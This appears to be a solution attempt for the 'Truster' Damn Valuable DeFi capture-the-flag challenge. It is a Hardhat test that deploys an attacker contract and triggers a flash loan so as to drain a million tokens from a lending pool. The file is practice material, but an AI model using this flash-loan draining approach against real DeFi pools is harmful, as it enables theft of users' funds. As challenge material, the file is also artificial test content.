const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        
        // let token = await this.token.connect(attacker)
        // let pool = await this.pool.connect(attacker)     
        
        // let bal = await this.token.balanceOf(pool.address);
        // console.log(parseInt(bal._hex, 16))
        console.log(this.token.address)
        let allowance = await this.token.allowance(this.pool.address, this.token.address)
        console.log(parseInt(allowance._hex, 16))

        const AttackTruster = await ethers.getContractFactory('AttackTruster', attacker);
        attackerContract = await AttackTruster.deploy(this.pool.address);
        await attackerContract.executeFlashLoan(this.token.address, TOKENS_IN_POOL);

        allowance = await this.token.allowance(this.pool.address, this.token.address)
        console.log(parseInt(allowance._hex, 16))
        // await this.token.transferFrom(this.pool.address, this.token.address, TOKENS_IN_POOL);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

